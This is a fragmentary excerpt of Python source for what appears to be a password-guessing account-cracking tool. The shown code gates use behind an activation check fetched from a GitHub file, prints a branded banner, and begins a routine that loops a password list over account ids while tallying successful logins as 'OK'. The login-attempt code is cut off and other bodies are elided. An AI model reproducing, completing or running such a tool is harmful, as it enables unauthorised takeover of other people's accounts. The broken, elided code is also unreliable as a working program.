...
def FKING_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/jawid1/jawid/New-JKing/blob/main/Activation.txt').text
...
\033[1;33m================== \33[32;33mAFG ≠ 2023 ≠ 64 Bit\33[1;33m ========================""")
  ...
  try:
    httpCaht = requests.get("https://github.com/jawid1/jawid/New-JKing/blob/main/Activation.txt").text
    if id in httpCaht:
...
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [JAWID➥AHMADI]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
